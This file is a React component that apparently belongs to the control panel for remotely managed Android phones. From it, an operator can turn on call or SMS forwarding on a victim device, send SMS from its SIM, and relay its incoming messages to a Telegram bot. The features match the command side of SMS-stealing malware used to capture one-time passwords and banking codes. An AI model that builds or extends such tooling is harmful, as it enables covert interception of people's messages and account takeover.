import { useSocket } from "../../context/SocketContext";
import { useState, useEffect } from "react";
import { FiX } from "react-icons/fi";
import { toast } from "sonner";

export type ModalType = "forwarding" | "sms" | "telegram";

interface SimData {
  simSlotIndex: number;
  phoneNumber?: string;
  carrierName?: string;
}

interface UnifiedModalProps {
  show: boolean;
  onClose: () => void;
  device: any;
  isLoading: boolean;
  setIsLoading: (loading: boolean) => void;
  modalType: ModalType;
}

export default function UnifiedModal({
  show,
  onClose,
  device,
  isLoading,
  setIsLoading,
  modalType,
}: UnifiedModalProps) {
  const { socket, isConnected } = useSocket();

  const [forwardingData, setForwardingData] = useState({
    sim: "0",
    number: "",
    type: "sms",
    enabled: true,
  });

  const [smsData, setSmsData] = useState({
    number: "",
    message: "",
    sim: "0",
  });

  const [telegramData, setTelegramData] = useState({
    chatId: "",
    botToken: "",
    type: "sms",
    enabled: false,
  });

  const [responseTimeout, setResponseTimeout] = useState<NodeJS.Timeout | null>(
    null
  );

  const getValidSimData = (): SimData[] => {
    try {
      const simData = device?.simData;

      if (!Array.isArray(simData)) return [];

      return simData.filter(
        (sim) => sim && (sim.phoneNumber || sim.carrierName)
      );
    } catch (err) {
      console.error("Failed to process simData:", err);
      return [];
    }
  };

  useEffect(() => {
    const sims = getValidSimData();
    if (sims.length > 0) {
      setForwardingData((prev) => ({
        ...prev,
        sim: sims[0].simSlotIndex.toString(),
      }));
      setSmsData((prev) => ({ ...prev, sim: sims[0].simSlotIndex.toString() }));
    }
  }, [device?.simData]);

  useEffect(() => {
    if (!socket || !isConnected) return;

    const handleClientAction = (data: any) => {
      if (responseTimeout) {
        clearTimeout(responseTimeout);
        setResponseTimeout(null);
      }

      setIsLoading(false);

      if (data.type === "error") {
        toast.error(data.message);
      } else {
        toast.success(data.message);
      }

      onClose();
    };

    socket.on("cleint_action_info", handleClientAction);

    return () => {
      socket.off("cleint_action_info", handleClientAction);
      if (responseTimeout) {
        clearTimeout(responseTimeout);
      }
    };
  }, [socket, responseTimeout]);

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();

    if (!socket || !device?.socketId) {
      toast.error("Socket connection or device ID not available");
      onClose();
      return;
    }

    setIsLoading(true);

    const timeout = setTimeout(() => {
      setIsLoading(false);
      toast.error("No response from device. Please try again.");
      setResponseTimeout(null);
    }, 5000);

    setResponseTimeout(timeout);

    try {
      let commandData: any = {
        socketId: socket.id,
        toClient: device.socketId,
        user_id: device.userId,
        device_id: device.deviceId,
      };

      switch (modalType) {
        case "forwarding":
          commandData.action = "forward";
          commandData.toNumber = forwardingData.number;
          commandData.type = forwardingData.type === "sms" ? 1 : 0;
          commandData.from = parseInt(forwardingData.sim);
          commandData.isEnable = forwardingData.enabled;
          break;

        case "sms":
          commandData.action = "sendSms";
          commandData.phone_number = smsData.number;
          commandData.text_message = smsData.message;
          commandData.from = parseInt(smsData.sim);
          break;

        case "telegram":
          commandData.action = "smsToTelegram";
          commandData.toToken = telegramData.botToken;
          commandData.toUser = telegramData.chatId;
          commandData.type = telegramData.type === "sms" ? 0 : 1;
          commandData.isActive = telegramData.enabled;
          break;

        default:
          throw new Error("Unknown modal type");
      }

      socket.emit("server_command_to_user", commandData);
    } catch (err) {
      console.error("Error sending command:", err);
      setIsLoading(false);
      if (responseTimeout) {
        clearTimeout(responseTimeout);
        setResponseTimeout(null);
      }
      toast.error("Failed to send command");
    }
  };

  const getTitle = () => {
    switch (modalType) {
      case "forwarding":
        return "Call/SMS Forwarding";
      case "sms":
        return "Send SMS";
      case "telegram":
        return "Telegram Configuration";
      default:
        return "";
    }
  };

  const renderSimSelect = (value: string, onChange: (val: string) => void) => (
    <select
      className="w-full bg-gray-700 border border-gray-600 rounded-md px-3 py-2 text-white focus:border-indigo-500 focus:ring-1 focus:ring-indigo-500"
      value={value}
      onChange={(e) => onChange(e.target.value)}
    >
      {getValidSimData().map((sim) => (
        <option key={sim.simSlotIndex} value={sim.simSlotIndex.toString()}>
          SIM {sim.simSlotIndex + 1}: {sim.phoneNumber || "Unknown"}
        </option>
      ))}
    </select>
  );

  const renderFormContent = () => {
    switch (modalType) {
      case "forwarding":
        return (
          <>
            <div>
              <label className="block text-sm text-gray-400 mb-1">
                Select SIM
              </label>
              {renderSimSelect(forwardingData.sim, (val) =>
                setForwardingData({ ...forwardingData, sim: val })
              )}
            </div>
            <div>
              <label className="block text-sm text-gray-400 mb-1">
                Forward To Number
              </label>
              <input
                type="text"
                className="w-full bg-gray-700 border border-gray-600 rounded-md px-3 py-2 text-white focus:border-indigo-500 focus:ring-1 focus:ring-indigo-500"
                placeholder="Enter phone number"
                value={forwardingData.number}
                onChange={(e) =>
                  setForwardingData({
                    ...forwardingData,
                    number: e.target.value,
                  })
                }
              />
            </div>
            <div>
              <label className="block text-sm text-gray-400 mb-1">
                Forward Type
              </label>
              <select
                className="w-full bg-gray-700 border border-gray-600 rounded-md px-3 py-2 text-white focus:border-indigo-500 focus:ring-1 focus:ring-indigo-500"
                value={forwardingData.type}
                onChange={(e) =>
                  setForwardingData({ ...forwardingData, type: e.target.value })
                }
              >
                <option value="sms">SMS Only</option>
                <option value="call">Call Only</option>
              </select>
            </div>
            <div className="flex items-center">
              <label className="inline-flex items-center cursor-pointer">
                <input
                  type="checkbox"
                  className="sr-only peer"
                  checked={forwardingData.enabled}
                  onChange={(e) =>
                    setForwardingData({
                      ...forwardingData,
                      enabled: e.target.checked,
                    })
                  }
                />
                <div className="relative w-11 h-6 bg-gray-700 peer-focus:outline-none rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:start-[2px] after:bg-white after:border-gray-300 after:border after:rounded-full after:h-5 after:w-5 after:transition-all peer-checked:bg-indigo-600"></div>
                <span className="ms-3 text-sm text-gray-300">
                  {forwardingData.enabled ? "Enabled" : "Disabled"}
                </span>
              </label>
            </div>
          </>
        );

      case "sms":
        return (
          <>
            <div>
              <label className="block text-sm text-gray-400 mb-1">
                Select SIM
              </label>
              {renderSimSelect(smsData.sim, (val) =>
                setSmsData({ ...smsData, sim: val })
              )}
            </div>
            <div>
              <label className="block text-sm text-gray-400 mb-1">
                Recipient Number
              </label>
              <input
                type="text"
                className="w-full bg-gray-700 border border-gray-600 rounded-md px-3 py-2 text-white focus:border-indigo-500 focus:ring-1 focus:ring-indigo-500"
                placeholder="Enter phone number"
                value={smsData.number}
                onChange={(e) =>
                  setSmsData({ ...smsData, number: e.target.value })
                }
                required
              />
            </div>
            <div>
              <label className="block text-sm text-gray-400 mb-1">
                Message
              </label>
              <textarea
                className="w-full bg-gray-700 border border-gray-600 rounded-md px-3 py-2 text-white focus:border-indigo-500 focus:ring-1 focus:ring-indigo-500"
                rows={4}
                placeholder="Enter your message"
                value={smsData.message}
                onChange={(e) =>
                  setSmsData({ ...smsData, message: e.target.value })
                }
                required
              />
            </div>
          </>
        );

      case "telegram":
        return (
          <>
            <div>
              <label className="block text-sm text-gray-400 mb-1">
                Chat ID
              </label>
              <input
                type="text"
                className="w-full bg-gray-700 border border-gray-600 rounded-md px-3 py-2 text-white focus:border-indigo-500 focus:ring-1 focus:ring-indigo-500"
                placeholder="Enter Telegram Chat ID"
                value={telegramData.chatId}
                onChange={(e) =>
                  setTelegramData({ ...telegramData, chatId: e.target.value })
                }
              />
            </div>
            <div>
              <label className="block text-sm text-gray-400 mb-1">
                Bot Token
              </label>
              <input
                type="text"
                className="w-full bg-gray-700 border border-gray-600 rounded-md px-3 py-2 text-white focus:border-indigo-500 focus:ring-1 focus:ring-indigo-500"
                placeholder="Enter Telegram Bot Token"
                value={telegramData.botToken}
                onChange={(e) =>
                  setTelegramData({ ...telegramData, botToken: e.target.value })
                }
              />
            </div>
            <div>
              <label className="block text-sm text-gray-400 mb-1">
                Notification Type
              </label>
              <select
                className="w-full bg-gray-700 border border-gray-600 rounded-md px-3 py-2 text-white focus:border-indigo-500 focus:ring-1 focus:ring-indigo-500"
                value={telegramData.type}
                onChange={(e) =>
                  setTelegramData({ ...telegramData, type: e.target.value })
                }
              >
                <option value="sms">SMS Notifications</option>
                <option value="connection">Connection Notifications</option>
              </select>
            </div>
            <div className="flex items-center">
              <label className="inline-flex items-center cursor-pointer">
                <input
                  type="checkbox"
                  className="sr-only peer"
                  checked={telegramData.enabled}
                  onChange={(e) =>
                    setTelegramData({
                      ...telegramData,
                      enabled: e.target.checked,
                    })
                  }
                />
                <div className="relative w-11 h-6 bg-gray-700 peer-focus:outline-none rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:start-[2px] after:bg-white after:border-gray-300 after:border after:rounded-full after:h-5 after:w-5 after:transition-all peer-checked:bg-indigo-600"></div>
                <span className="ms-3 text-sm text-gray-300">
                  {telegramData.enabled ? "Enabled" : "Disabled"}
                </span>
              </label>
            </div>
          </>
        );

      default:
        return null;
    }
  };

  if (!show) return null;

  return (
    <div className="fixed inset-0 backdrop-blur-sm bg-black/10 flex items-center justify-center p-4 z-50">
      <div className="bg-gray-800 rounded-xl shadow-2xl border border-gray-700 w-full max-w-md">
        <div className="flex justify-between items-center p-4 border-b border-gray-700">
          <h3 className="text-lg font-bold text-white">{getTitle()}</h3>
          <button onClick={onClose} className="text-gray-400 hover:text-white">
            <FiX size={24} />
          </button>
        </div>
        <form onSubmit={handleSubmit} className="p-6">
          <div className="space-y-4">{renderFormContent()}</div>
          <div className="mt-6 flex justify-end gap-3">
            <button
              type="button"
              onClick={onClose}
              className="px-4 py-2 bg-gray-700 hover:bg-gray-600 text-white rounded-md transition-colors"
            >
              Cancel
            </button>
            <button
              type="submit"
              className="px-4 py-2 bg-gradient-to-r from-indigo-600 to-purple-600 hover:from-indigo-700 hover:to-purple-700 text-white rounded-md flex items-center gap-2 transition-colors"
              disabled={isLoading}
            >
              {isLoading ? (
                <>
                  <svg
                    className="animate-spin h-5 w-5 text-white"
                    xmlns="http://www.w3.org/2000/svg"
                    fill="none"
                    viewBox="0 0 24 24"
                  >
                    <circle
                      className="opacity-25"
                      cx="12"
                      cy="12"
                      r="10"
                      stroke="currentColor"
                      strokeWidth="4"
                    ></circle>
                    <path
                      className="opacity-75"
                      fill="currentColor"
                      d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
                    ></path>
                  </svg>
                  {modalType === "sms" ? "Sending..." : "Saving..."}
                </>
              ) : modalType === "sms" ? (
                "Send SMS"
              ) : (
                "Save Settings"
              )}
            </button>
          </div>
        </form>
      </div>
    </div>
  );
}
